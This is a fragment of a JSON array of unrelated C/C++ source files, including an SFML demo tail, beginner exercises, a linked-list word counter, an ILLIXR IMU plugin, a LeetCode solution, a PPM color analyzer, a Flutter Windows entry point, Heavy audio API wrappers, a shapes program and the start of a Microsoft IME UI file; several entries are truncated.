sprite1.setRotation(time * 100);\n            SFMLView1.draw(sprite1);\n\n            // Draw sprite 2 on view 2\n            sprite2.setPosition(std::cos(time) * 100.f, 0.f);\n            SFMLView2.draw(sprite2);\n\n            // Display each view on screen\n            SFMLView1.display();\n            SFMLView2.display();\n        }\n    }\n\n    // Destroy the main window (all its child controls will be destroyed)\n    DestroyWindow(window);\n\n    // Don't forget to unregister the window class\n    UnregisterClass(TEXT(\"SFML App\"), instance);\n\n    return EXIT_SUCCESS;\n}\n",
    "\ufeffusing namespace std;\n#include <iostream>\n\nint main() {\n\t//1\n\t//int N, K;\n\t//cout << \" N: \";\n\t//cin >> N;\n\t//cout << \" K: \";\n\t//cin >> K;\n\n\t//for (int i = 0; i < N; ++i) {\n\t//\tfor (int j = 0; j < K; ++j) {\n\t//\t\tcout << '*'; \n\t//\t}\n\t//\tcout << '\\n'; \n\t//}\n\t\n\n\t//2\n\t//int factorial(int n); {\n\t//\tint result = 1;\n\t//\tfor (int i = 1; i <= n; ++i) {\n\t//\t\tresult *= i;\n\t//\t}\n\t//\treturn result;\n\t//}\n\t//\tint n;\n\t//\tcout << \"Enter a number: \";\n\t//\tcin >> n;\n\t//\tcout << \"Factorial of \" << n << \" is \" << factorial(n) << '\\n';\n\t\n\t//3\n\t//int factorial(int n); {\n\t//\tint result = 1;\n\t//\tfor (int i = 1; i <= n; ++i) {\n\t//\t\tresult *= i;\n\t//\t}\n\t//\treturn result;\n\t//}\n\n\t//\tint n;\n\t//\tcout << \"Enter a number: \";\n\t//\tcin >> n;\n\n\t//\tcout << \"Factorial of \" << n << \" is \" << factorial(n) << '\\n';\n\n\t//5\n\t//int max(int min, int max);\n\t//\tint num1, num2;\n\t//\tcout << \"Enter two numbers: \";\n\t//\tcin >> num1 >> num2;\n\t//\tcout << \"The largest number is: \" << max(num1, num2) << endl;\n\t//}\n\t//int max(int min, int max)\n\t//{\n\t//\tif (min > max)\n\t//\t\treturn min;\n\t//\telse\n\t//\t\treturn max;\n\t//\n\t\n\t//4\n\t//int cube(int number); {\n\t//\treturn number * number * number;\n\t//}\n\t//\tint num;\n\n\t//\tcout << \"Enter a number: \";\n\t//\tcin >> num;\n\n\t//\tcout << \"The cube of a number \" << num << \" = \" << cube(num) << endl;\n\n\n\t//6\n\t//bool isPositive(int number); {\n\t//\treturn number > 0; \n\t//}\n\n\t//\tint num;\n\n\t//\tcout << \"Enter a number: \";\n\t//\tcin >> num;\n\n\t//\tif (isPositive(num)) {\n\t//\t\tcout << \"The number \" << num << \" is positive.\" << endl;\n\t//\t}\n\t//\telse {\n\t//\t\tcout << \"The number \" << num << \" is negative or zero.\" << endl;\n\t//\t}\n\n\n\n\n\n\n\n\n//void printMEssage()\n//{\n//\tcout << \"Hello, World\" << endl;\n//}\n//void printMessageFromUser(int age) \n//\n//{\n//\tage++;\n//\tcout << \"Hello, yuo are \" << age << \"years old\" << endl;\n//\tage++;\n//}\n//\n//void paintStar()\n//{\n//\tcout << \" *\" << \"\";\n//}\n//void countStars(int count)\n//{\n//\tfor (int i = 0; i < count; i++)\n//\t{\n//\t\tpaintStar();\n//\t}\n//}\n//void showSymbols(int count = 5, char sym = '#')\n//{\n//\tfor (int i = 0; i < count; i++)\n//\t{\n//\t\tcout << sym;\n//\t}\n//}\n//\n//int printUsersAge(int age)\n//{\n//\tage += 10;\n//\tif (age > 100) {\n//\treturn age;\n//}\n//\telse {\n//\t\treturn age;\n//\t}\n//}\n//void showSumOfArr(int arr[])\n//{int sum = 0\n//\tfor (int i = 0; i < size; i++)\n//\t{\n//\t\tsum += arr[i]\n//\t}\n//\tcout << \"Sum of array is:\" << sum << endl;\n//}\n//\n//\n\n//{\n//\n//\tint arr2[]{ 1,2,3,4,5,6,7,8,9,10,67,76,67,676,76,76, };\n//\tint size = sizeof(arr2) / sizeof(arr[0]);\n//\tshowSumOfArr(arr2, size);\n\t//int num;\n\t//char symbol;\n\t//cout << \"Enter number of symbols :\";\n\t//cin >> num;\n\t////cout << \"Enter symbol :\";\n\t////cin >> symbol;\n\t//showSymbols(num, symbol);\n\t//countStars(5);\n\n\n\n\t//int b = 33;\n\t//printMEssage();\n\t//printMessageFromUser(b);\n\t//cout << \"b is \" << b << endl;\n\t//cout << \"age of yser :\" << printUsersAge(b) << endl;\n\t//int age = printUsersAge(66);\n\t//cout << age << endl;\n}\n\n",
    "#include \"linkedlist.h\"\n#include <iostream>\n#include <cctype>\n#include <string>\n\nusing namespace std;\n\n// constructor\nLinkedList::LinkedList() \n{\n    head = nullptr; \n    countCleanedWords = 0; \n    countTotalWords = 0; \n\n}\n\n// destructor\nLinkedList::~LinkedList()\n{\n    Node *current = head;\n    while (current != nullptr) \n    {\n        Node *nextNode = current->next;\n        delete current;\n        current = nextNode;\n    }\n}\n\nvoid LinkedList::insertSorted(const string &word) \n{\n    // duplicate check\n    Node *current = head;\n    while (current != nullptr) \n    {\n        if (current->word == word) \n        {\n            return;\n        }\n        current = current->next;\n    }\n\n    Node *newNode = new Node(word);\n\n    if (head == nullptr || word < head->word) \n    {\n        countCleanedWords++;\n        newNode->next = head;\n        head = newNode;\n        return;\n    }\n\n    Node *prev = nullptr;\n    current = head;\n    while (current != nullptr && current->word < word) \n    {\n        prev = current;\n        current = current->next;\n    }\n\n    newNode->next = prev->next;\n    prev->next = newNode;\n    countCleanedWords++;\n}\n\nvoid LinkedList::read_txt(ifstream &inputfile)\n{\n    string word;\n\n    while(inputfile >> word)\n    {\n        string cleanedWord = \"\";\n\n        countTotalWords+=1;\n\n        for (int i = 0; i < word.length(); i++) \n        {\n            if(isalpha(word[i]) || word[i] == '-' || word[i] == '\\'') \n            {\n                cleanedWord = cleanedWord + char(tolower(word[i]));\n            }\n\n        }\n\n        if (!cleanedWord.empty()) \n        {\n            insertSorted(cleanedWord);\n        }\n    }\n}\n\nvoid LinkedList::printList() const \n{\n    Node *current = head;\n    while (current != nullptr) \n    {\n        cout << current->word << endl;\n        current = current->next;\n    }\n}\n\nvoid LinkedList::output() const\n{\n    cout << endl;\n    cout << \"Total unique words: \" << countCleanedWords << endl;\n    cout << \"Total words: \" << countTotalWords << endl;\n}\n",
    "#include \"data_loading.hpp\"\n#include \"illixr/data_format.hpp\"\n#include \"illixr/managed_thread.hpp\"\n#include \"illixr/phonebook.hpp\"\n#include \"illixr/relative_clock.hpp\"\n#include \"illixr/switchboard.hpp\"\n#include \"illixr/threadloop.hpp\"\n\n#include <chrono>\n\nusing namespace ILLIXR;\n\nclass offline_imu : public ILLIXR::threadloop {\npublic:\n    offline_imu(const std::string& name_, phonebook* pb_)\n        : threadloop{name_, pb_}\n        , _m_sensor_data{load_data()}\n        , _m_sensor_data_it{_m_sensor_data.cbegin()}\n        , _m_sb{pb->lookup_impl<switchboard>()}\n        , _m_imu{_m_sb->get_writer<imu_type>(\"imu\")}\n        , dataset_first_time{_m_sensor_data_it->first}\n        , dataset_now{0}\n        , imu_cam_log{record_logger_}\n        , _m_rtc{pb->lookup_impl<RelativeClock>()} { }\n\nprotected:\n    skip_option _p_should_skip() override {\n        if (_m_sensor_data_it != _m_sensor_data.end()) {\n            assert(dataset_now < _m_sensor_data_it->first);\n            dataset_now = _m_sensor_data_it->first;\n            // Sleep for the difference between the current IMU vs 1st IMU and current UNIX time vs UNIX time the component was\n            // init\n            std::this_thread::sleep_for(std::chrono::nanoseconds{dataset_now - dataset_first_time} -\n                                        _m_rtc->now().time_since_epoch());\n\n            return skip_option::run;\n\n        } else {\n            return skip_option::stop;\n        }\n    }\n\n    void _p_one_iteration() override {\n        assert(_m_sensor_data_it != _m_sensor_data.end());\n        time_point          real_now(std::chrono::duration<long, std::nano>{dataset_now - dataset_first_time});\n        const sensor_types& sensor_datum = _m_sensor_data_it->second;\n\n        _m_imu.put(_m_imu.allocate<imu_type>(imu_type{real_now, (sensor_datum.imu0.angular_v), (sensor_datum.imu0.linear_a)}));\n        ++_m_sensor_data_it;\n    }\n\nprivate:\n    const std::map<ullong, sensor_types>           _m_sensor_data;\n    std::map<ullong, sensor_types>::const_iterator _m_sensor_data_it;\n    const std::shared_ptr<switchboard>             _m_sb;\n    switchboard::writer<imu_type>                  _m_imu;\n\n    // Timestamp of the first IMU value from the dataset\n    ullong dataset_first_time;\n    // Current IMU timestamp\n    ullong dataset_now;\n\n    record_coalescer imu_cam_log;\n\n    std::shared_ptr<RelativeClock> _m_rtc;\n};\n\nPLUGIN_MAIN(offline_imu)\n",
    "/*\n\nLeetcode 540 :- Single Element in a Sorted Array(Medium)\n\nProblem Summary:\nIn this problem, each element in a sorted array appears exactly twice, except for one element which appears only once. The task is to find that single non-duplicate element in O(log n) time using binary search.\n\nDetailed Explanation:\nBinary Search with Even/Odd Index Check:\nWe can split the array into pairs of elements. If the pair starts at an even index, the non-duplicate element lies in the right half. Otherwise, it\u2019s in the left half.\nUse binary search to find the point where this property breaks (i.e., where the non-duplicate element is).\n\nKey Insights:\n\nTime Complexity: O(log n) because binary search is applied.\nSpace Complexity: O(1) because no extra space is used.\n\nEdge Cases:\nIf the array has only one element, that is the non-duplicate element.\nWorks with both odd and even-length arrays.\n\n*/\n\nclass Solution {\npublic:\n    int singleNonDuplicate(vector<int>& nums) {\n        int left  = 0;\n        int right = nums.size() - 1;\n\n        while(left < right){\n            int mid = left + (right - left) / 2;\n            bool isEven;\n\n            if((right - mid) % 2 == 0){\n                isEven = true;\n            }\n            else{\n                isEven = false;\n            }\n\n            if(nums[mid] != nums[mid + 1]){  // Check if mid element is part of the pair\n                if(isEven){\n                    right = mid;  // Move towards left if the first half is even\n                }\n                else{\n                    left = mid + 1;  // Move right if the first half is odd\n                }\n            }\n            else{\n                if(isEven){\n                    left = mid + 2;  // Move right if the second half is even\n                }\n                else{\n                    right = mid - 1;  // Move left if the second half is odd\n                }\n            }\n        }\n\n        return nums[right];  // At the end, left == right, return single element\n    }\n};\n",
    "\ufeff\r\n#include <iostream>\r\n#include <fstream>\r\n#include <cstdlib>\r\n#include <string>\r\n#include <vector>\r\n#include <sstream>\r\n#include <algorithm>\r\n#include <stdio.h>\r\n\r\nusing namespace std;\r\n\r\nvector<int> PixVal;\r\n\r\nvoid Numbercatcher(string PixInfline)\r\n{\r\n    stringstream tmp;\r\n    string temp;\r\n    int found;\r\n    tmp << PixInfline;\r\n    while (!tmp.eof())\r\n    {\r\n        tmp >> temp;\r\n        if (stringstream(temp) >> found)\r\n        {\r\n            PixVal.push_back(found);\r\n        }\r\n    }\r\n}\r\n\r\nunsigned long CRGB(int r, int g, int b)\r\n{\r\n    return ((r & 0xff) << 16) + ((g & 0xff) << 8) + (b & 0xff);\r\n}\r\n\r\nint main()\r\n{\r\nstart:\r\n    string line, test, path, answer;\r\n    int type = 0, width = 0, height = 0, uniq = 0, notuniq = 0, max = 0, x = 0;\r\n    fstream file;\r\n    vector<string> PixInf;\r\n    vector<int> PixMax;\r\n    vector<int> temp;\r\n\r\n\r\n    PixInf.clear();\r\n    PixMax.clear();\r\n    PixVal.clear();\r\n    temp.clear();\r\n    line.clear();\r\n    test.clear();\r\n    path.clear();\r\n    answer.clear();\r\n\r\n\r\n    cout << \"input path to your image (use double \\\\): \";\r\n    cin >> path;\r\n\r\n    file.open(path, ios::in); \r\n    if (file.good()) \r\n    {\r\n\r\n        while (!file.eof())\r\n        {\r\n            getline(file, line);\r\n            if (line[0] == '#')\r\n                continue;\r\n            else\r\n                PixInf.push_back(line);\r\n        }\r\n        file.close();\r\n\r\n\r\n        if (PixInf[0][1] == '1' || PixInf[0][1] == '4')\r\n            type = 1;\r\n        if (PixInf[0][1] == '2' || PixInf[0][1] == '5')\r\n            type = 2;\r\n        if (PixInf[0][1] == '3' || PixInf[0][1] == '6')\r\n            type = 3;\r\n        PixInf.erase(PixInf.begin());\r\n\r\n\r\n        for (int i = 0; i <= PixInf.size() - 1; i++)\r\n        {\r\n            Numbercatcher(PixInf[i]);\r\n        }\r\n\r\n\r\n        width = PixVal[0];\r\n        PixVal.erase(PixVal.begin());\r\n        height = PixVal[0];\r\n        PixVal.erase(PixVal.begin());\r\n\r\n\r\n        if (type == 2 || type == 3)\r\n        {\r\n            PixVal.erase(PixVal.begin());\r\n        }\r\n\r\n\r\n        if (type == 3)\r\n        {\r\n            for (int i = 0; i <= (PixVal.size() / 3) - 1; i++)\r\n            {\r\n                temp.push_back(CRGB(PixVal[x], PixVal[x + 1], PixVal[x + 2]));\r\n                x += 3;\r\n            }\r\n            PixVal = temp;\r\n        }\r\n\r\n\r\n        temp = PixVal;\r\n        sort(temp.begin(), temp.end());\r\n        temp.erase(unique(temp.begin(), temp.end()), temp.end());\r\n        uniq = temp.size();\r\n\r\n\r\n        for (int i = 0; i <= temp.size() - 1; i++)\r\n        {\r\n            PixMax.push_back(temp[i]);\r\n            PixMax.push_back(count(PixVal.begin(), PixVal.end(), temp[i]));\r\n        }\r\n\r\n        x = 0;\r\n        for (int i = 0; i <= (PixMax.size() / 2) - 1; i++)\r\n        {\r\n            if (PixMax[x + 1] > max)\r\n            {\r\n                max = PixMax[x + 1];\r\n                notuniq = PixMax[x];\r\n            }\r\n            x += 2;\r\n        }\r\n\r\n\r\n        cout << \"width= \" << width << \" pixels.\" << endl;\r\n        cout << \"height= \" << height << \" pixels.\" << endl;\r\n        cout << \"the most common color is: \" << hex << notuniq << dec << \" and it appears \" << max << \" times.\" << endl;\r\n        cout << \"total number of unique colors is: \" << uniq << \".\" << endl;\r\n\r\n\r\n        while (true)\r\n        {\r\n            cout << \"do you want to continue? (Y/N): \";\r\n            cin >> answer;\r\n            if (answer == \"Y\")\r\n            {\r\n                goto start;\r\n            }\r\n            if (answer == \"N\")\r\n            {\r\n                cout << \"bye bye\";\r\n                return 0;\r\n            }\r\n            cout << \"write only Y or N\" << endl;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"invalid path.\" << endl;\r\n    }\r\n\r\n    return 404;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_exam2_61611888\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n * Copyright (c) 2014-2018 Enzien Audio Ltd.\n *\n * Permission to use, copy, modify, and/or distribute this software for any\n * purpose with or without fee is hereby granted, provided that the above\n * copyright notice and this permission notice appear in all copies.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH\n * REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY\n * AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,\n * INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM\n * LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR\n * OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR\n * PERFORMANCE OF THIS SOFTWARE.\n */\n\n#include \"HeavyContext.hpp\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#if HV_APPLE\n#pragma mark - Heavy Table\n#endif\n\nHV_EXPORT bool hv_table_setLength(HeavyContextInterface *c, hv_uint32_t tableHash, hv_uint32_t newSampleLength) {\n  hv_assert(c != nullptr);\n  return c->setLengthForTable(tableHash, newSampleLength);\n}\n\nHV_EXPORT float *hv_table_getBuffer(HeavyContextInterface *c, hv_uint32_t tableHash) {\n  hv_assert(c != nullptr);\n  return c->getBufferForTable(tableHash);\n}\n\nHV_EXPORT hv_uint32_t hv_table_getLength(HeavyContextInterface *c, hv_uint32_t tableHash) {\n  hv_assert(c != nullptr);\n  return c->getLengthForTable(tableHash);\n}\n\n\n\n#if HV_APPLE\n#pragma mark - Heavy Message\n#endif\n\nHV_EXPORT hv_size_t hv_msg_getByteSize(hv_uint32_t numElements) {\n  return msg_getCoreSize(numElements);\n}\n\nHV_EXPORT void hv_msg_init(HvMessage *m, int numElements, hv_uint32_t timestamp) {\n  msg_init(m, numElements, timestamp);\n}\n\nHV_EXPORT hv_size_t hv_msg_getNumElements(const HvMessage *m) {\n  return msg_getNumElements(m);\n}\n\nHV_EXPORT hv_uint32_t hv_msg_getTimestamp(const HvMessage *m) {\n  return msg_getTimestamp(m);\n}\n\nHV_EXPORT void hv_msg_setTimestamp(HvMessage *m, hv_uint32_t timestamp) {\n  msg_setTimestamp(m, timestamp);\n}\n\nHV_EXPORT bool hv_msg_isBang(const HvMessage *const m, int i) {\n  return msg_isBang(m,i);\n}\n\nHV_EXPORT void hv_msg_setBang(HvMessage *m, int i) {\n  msg_setBang(m,i);\n}\n\nHV_EXPORT bool hv_msg_isFloat(const HvMessage *const m, int i) {\n  return msg_isFloat(m, i);\n}\n\nHV_EXPORT float hv_msg_getFloat(const HvMessage *const m, int i) {\n  return msg_getFloat(m,i);\n}\n\nHV_EXPORT void hv_msg_setFloat(HvMessage *m, int i, float f) {\n  msg_setFloat(m,i,f);\n}\n\nHV_EXPORT bool hv_msg_isSymbol(const HvMessage *const m, int i) {\n  return msg_isSymbol(m,i);\n}\n\nHV_EXPORT const char *hv_msg_getSymbol(const HvMessage *const m, int i) {\n  return msg_getSymbol(m,i);\n}\n\nHV_EXPORT void hv_msg_setSymbol(HvMessage *m, int i, const char *s) {\n  msg_setSymbol(m,i,s);\n}\n\nHV_EXPORT bool hv_msg_isHash(const HvMessage *const m, int i) {\n  return msg_isHash(m, i);\n}\n\nHV_EXPORT hv_uint32_t hv_msg_getHash(const HvMessage *const m, int i) {\n  return msg_getHash(m, i);\n}\n\nHV_EXPORT bool hv_msg_hasFormat(const HvMessage *const m, const char *fmt) {\n  return msg_hasFormat(m, fmt);\n}\n\nHV_EXPORT char *hv_msg_toString(const HvMessage *const m) {\n  return msg_toString(m);\n}\n\nHV_EXPORT HvMessage *hv_msg_copy(const HvMessage *const m) {\n  return msg_copy(m);\n}\n\nHV_EXPORT void hv_msg_free(HvMessage *m) {\n  msg_free(m);\n}\n\n\n\n#if HV_APPLE\n#pragma mark - Heavy Common\n#endif\n\nHV_EXPORT int hv_getSize(HeavyContextInterface *c) {\n  hv_assert(c != nullptr);\n  return (int) c->getSize();\n}\n\nHV_EXPORT double hv_getSampleRate(HeavyContextInterface *c) {\n  hv_assert(c != nullptr);\n  return c->getSampleRate();\n}\n\nHV_EXPORT int hv_getNumInputChannels(HeavyContextInterface *c) {\n  hv_assert(c != nullptr);\n  return c->getNumInputChannels();\n}\n\nHV_EXPORT int hv_getNumOutputChannels(HeavyContextInterface *c) {\n  hv_assert(c != nullptr);\n  return c->getNumOutputChannels();\n}\n\nHV_EXPORT void hv_setPrintHook(HeavyContextInterface *c, HvPrintHook_t *f) {\n  hv_assert(c != nullptr);\n  c->setPrintHook(f);\n}\n\nHV_EXPORT HvPrintHook_t *hv_getPrintHook(HeavyContextInterface *c) {\n  hv_assert(c != nullptr);\n  return c->getPrintHook();\n}\n\nHV_EXPORT void hv_setSendHook(HeavyContextInterface *c, HvSendHook_t *f) {\n  hv_assert(c != nullptr);\n  c->setSendHook(f);\n}\n\nHV_EXPORT hv_uint32_t hv_stringToHash(const char *s) {\n  return hv_string_to_hash(s);\n}\n\nHV_EXPORT bool hv_sendBangToReceiver(HeavyContextInterface *c, hv_uint32_t receiverHash) {\n  hv_assert(c != nullptr);\n  return c->sendBangToReceiver(receiverHash);\n}\n\nHV_EXPORT bool hv_sendFloatToReceiver(HeavyContextInterface *c, hv_uint32_t receiverHash, float x) {\n  hv_assert(c != nullptr);\n  return c->sendFloatToReceiver(receiverHash, x);\n}\n\nHV_EXPORT bool hv_sendSymbolToReceiver(HeavyContextInterface *c, hv_uint32_t receiverHash, char *s) {\n  hv_assert(c != nullptr);\n  return c->sendSymbolToReceiver(receiverHash, s);\n}\n\nHV_EXPORT bool hv_sendMessageToReceiverV(\n    HeavyContextInterface *c, hv_uint32_t receiverHash, double delayMs, const char *format, ",
    "#include <iostream>\n#include <string>\n#include <string_view>\n#include <array>\n\n#include \"macros.h\"\n#include \"Vertex.h\"\n#include \"Board.h\"\n\n#define RECTANGLE           0\n#define ISOSCELESTRIANGLE   0\n#define DIAMOND             0\n#define WINDOW              0\n\n#if RECTANGLE\n#include \"Rectangle.h\"\nvoid printInfo(const Rectangle&);\n#endif\n\n#if ISOSCELESTRIANGLE\n#include \"IsoscelesTriangle.h\"\nvoid printInfo(const IsoscelesTriangle&);\n#endif\n\n#if DIAMOND\n#include \"Diamond.h\"\nvoid printInfo(const Diamond&);\n#endif\n\n#if WINDOW\n#include \"Window.h\"\nvoid printInfo(const Window&);\n#endif\n\nvoid waitForEnter();\nVertex readVertex(std::string_view vertexName, std::string_view shapeName);\n\ntemplate <typename Shape>\nvoid useShape(Shape& shape, std::string_view shapeName);\n\ntemplate <typename Shape>\nvoid draw(const Shape& shape, Board&);\n\ntemplate <typename Shape>\nvoid printGenericInfo(const Shape& shape, std::string_view shapeName);\n\nint main()\n{\n#if RECTANGLE\n    {\n        static constexpr auto shapeName = std::string_view(\"rectangle\");\n\n        const auto vertices = std::array<Vertex, 2>\n        {\n            readVertex(\"bottom-left\", shapeName),\n            readVertex(\"top-right\", shapeName)\n        };\n\n        std::cin.ignore(); // ignore the enter\n\n        auto rectangle = Rectangle(vertices.data());\n        useShape(rectangle, shapeName);\n    }\n#endif // RECTANGLE\n\n#if ISOSCELESTRIANGLE\n    {\n        static constexpr auto shapeName = std::string_view(\"isosceles triangle\");\n\n        const auto vertices = std::array<Vertex, 3>\n        {\n            readVertex(\"first\", shapeName),\n            readVertex(\"second\", shapeName),\n            readVertex(\"third\", shapeName)\n        };\n\n        std::cin.ignore(); // ignore the enter\n\n        auto isoscelesTriangle = IsoscelesTriangle(vertices.data());\n        useShape(isoscelesTriangle, shapeName);\n    }\n#endif // ISOSCELESTRIANGLE\n\n#if DIAMOND\n    {\n        static constexpr auto shapeName = std::string_view(\"diamond\");\n\n        const auto vertices = std::array<Vertex, 4>\n        {\n            readVertex(\"first\", shapeName),\n            readVertex(\"second\", shapeName),\n            readVertex(\"third\", shapeName),\n            readVertex(\"fourth\", shapeName)\n        };\n\n        std::cin.ignore(); // ignore the enter\n\n        auto diamond = Diamond(vertices.data());\n        useShape(diamond, shapeName);\n    }\n#endif // DIAMOND\n\n#if WINDOW\n    {\n        const auto readRectangle = [](std::string_view partOfShapeName)\n        {\n            auto vertices = std::array<Vertex, 2>();\n            vertices[0] = readVertex(\"bottom-left\", partOfShapeName);\n            vertices[1] = readVertex(\"top-right\", partOfShapeName);\n\n            std::cin.ignore(); // ignore the enter\n\n            return Rectangle(vertices.data());\n        };\n\n        static constexpr auto shapeName = std::string_view(\"window\");\n\n        const auto rectangle = readRectangle(\"rectangle of the \" + std::string(shapeName));\n        const auto innerVertex = readVertex(\"inner\", shapeName);\n\n        auto window = Window(rectangle, innerVertex);\n        useShape(window, shapeName);\n    }\n#endif // WINDOW\n}\n\n#if RECTANGLE\nvoid printInfo(const Rectangle& rectangle)\n{\n    static constexpr auto shapeName = std::string_view(\"rectangle\");\n\n    const auto printVertex = [](const Vertex& v, std::string_view vertexName)\n    {\n        std::cout << \"The \" << vertexName << \" vertex of the \" << shapeName\n            << \" is: \" << v << '\\n';\n    };\n\n    printVertex(rectangle.getBottomLeft(), \"bottom-left\");\n    printVertex(rectangle.getTopRight(), \"top-right\");\n}\n#endif // RECTANGLE\n\n#if ISOSCELESTRIANGLE\nvoid printInfo(const IsoscelesTriangle& isoscelesTriangle)\n{\n    static constexpr auto shapeName = std::string_view(\"isosceles triangle\");\n\n    std::cout << \"The vertices of the \" << shapeName << \" are:\\n\";\n    for (int i = 0; i < 3; ++i)\n    {\n        std::cout << isoscelesTriangle.getVertex(i) << '\\n';\n    }\n\n    std::cout << \"The length of the base of the \" << shapeName << \" is:\\n\";\n    std::cout << isoscelesTriangle.getBaseLength() << '\\n';\n\n    std::cout << \"The length of the legs of the \" << shapeName << \" is:\\n\";\n    std::cout << isoscelesTriangle.getLegLength() << '\\n';\n\n    std::cout << \"The height of the \" << shapeName << \" is:\\n\";\n    std::cout << isoscelesTriangle.getHeight() << '\\n';\n}\n#endif // ISOSCELESTRIANGLE\n\n#if DIAMOND\nvoid printInfo(const Diamond& diamond)\n{\n    static constexpr auto shapeName = std::string_view(\"diamond\");\n\n    std::cout << \"The vertices of the \" << shapeName << \" are:\\n\";\n    for (int i = 0; i < 4; ++i)\n    {\n        std::cout << diamond.getVertex(i) << '\\n';\n    }\n\n    std::cout << \"The width of the \" << shapeName << \" is: \"\n        << diamond.getWidth() << '\\n';\n    std::cout << \"The height of the \" << shapeName << \" is: \"\n        << diamond.getHeight() << '\\n';\n}\n#endif // DIAMOND\n\n#if WINDOW\nvoid printInfo(const Window& window)\n{\n    static constexpr auto shapeName = std::string_view(\"window\");\n\n   ",
    "//--------------------------------------------------------------------------------------\n// File: ImeUi.cpp\n//\n// Copyright (c) Microsoft Corporation.\n// Licensed under the MIT License.\n//\n// http://go.microsoft.com/fwlink/?LinkId=320437\n//--------------------------------------------------------------------------------------\n#include \"DXUT.h\"\n#include \"ImeUi.h\"\n#include <math.h>\n#include <msctf.h>\n#include <malloc.h>\n\n// Ignore typecast warnings\n#pragma warning( disable : 4312 )\n#pragma warning( disable : 4244 )\n#pragma warning( disable : 4311 )\n\n#ifdef _PREFAST_\n#pragma prefast( disable : 28159, \"GetTickCount() is fine for a blinking cursor\" )\n#endif\n\n#define MAX_CANDIDATE_LENGTH 256\n#define COUNTOF(a) ( sizeof( a ) / sizeof( ( a )[0] ) )\n#define POSITION_UNINITIALIZED\t((DWORD)-1)\n\n#define LANG_CHT\tMAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_TRADITIONAL)\n#define LANG_CHS\tMAKELANGID(LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED)\n\n#define MAKEIMEVERSION(major,minor) ( (DWORD)( ( (BYTE)( major ) << 24 ) | ( (BYTE)( minor ) << 16 ) ) )\n#define IMEID_VER(dwId)\t\t( ( dwId ) & 0xffff0000 )\n#define IMEID_LANG(dwId)\t( ( dwId ) & 0x0000ffff )\n\n#define _CHT_HKL_DAYI\t\t\t\t( (HKL)0xE0060404 )\t// DaYi\n#define _CHT_HKL_NEW_PHONETIC\t\t( (HKL)0xE0080404 )\t// New Phonetic\n#define _CHT_HKL_NEW_CHANG_JIE\t\t( (HKL)0xE0090404 )\t// New Chang Jie\n#define _CHT_HKL_NEW_QUICK\t\t\t( (HKL)0xE00A0404 )\t// New Quick\n#define _CHT_HKL_HK_CANTONESE\t\t( (HKL)0xE00B0404 )\t// Hong Kong Cantonese\n#define _CHT_IMEFILENAME\t\"TINTLGNT.IME\"\t// New Phonetic\n#define _CHT_IMEFILENAME2\t\"CINTLGNT.IME\"\t// New Chang Jie\n#define _CHT_IMEFILENAME3\t\"MSTCIPHA.IME\"\t// Phonetic 5.1\n#define IMEID_CHT_VER42 ( LANG_CHT | MAKEIMEVERSION( 4, 2 ) )\t// New(Phonetic/ChanJie)IME98  : 4.2.x.x // Win98\n#define IMEID_CHT_VER43 ( LANG_CHT | MAKEIMEVERSION( 4, 3 ) )\t// New(Phonetic/ChanJie)IME98a : 4.3.x.x // Win2k\n#define IMEID_CHT_VER44 ( LANG_CHT | MAKEIMEVERSION( 4, 4 ) )\t// New ChanJie IME98b          : 4.4.x.x // WinXP\n#define IMEID_CHT_VER50 ( LANG_CHT | MAKEIMEVERSION( 5, 0 ) )\t// New(Phonetic/ChanJie)IME5.0 : 5.0.x.x // WinME\n#define IMEID_CHT_VER51 ( LANG_CHT | MAKEIMEVERSION( 5, 1 ) )\t// New(Phonetic/ChanJie)IME5.1 : 5.1.x.x // IME2002(w/OfficeXP)\n#define IMEID_CHT_VER52 ( LANG_CHT | MAKEIMEVERSION( 5, 2 ) )\t// New(Phonetic/ChanJie)IME5.2 : 5.2.x.x // IME2002a(w/WinXP)\n#define IMEID_CHT_VER60 ( LANG_CHT | MAKEIMEVERSION( 6, 0 ) )\t// New(Phonetic/ChanJie)IME6.0 : 6.0.x.x // New IME 6.0(web download)\n#define IMEID_CHT_VER_VISTA ( LANG_CHT | MAKEIMEVERSION( 7, 0 ) )\t// All TSF TIP under Cicero UI-less mode: a hack to make GetImeId() return non-zero value\n\n#define _CHS_HKL\t\t( (HKL)0xE00E0804 )\t// MSPY\n#define _CHS_IMEFILENAME\t\"PINTLGNT.IME\"\t// MSPY1.5/2/3\n#define _CHS_IMEFILENAME2\t\"MSSCIPYA.IME\"\t// MSPY3 for 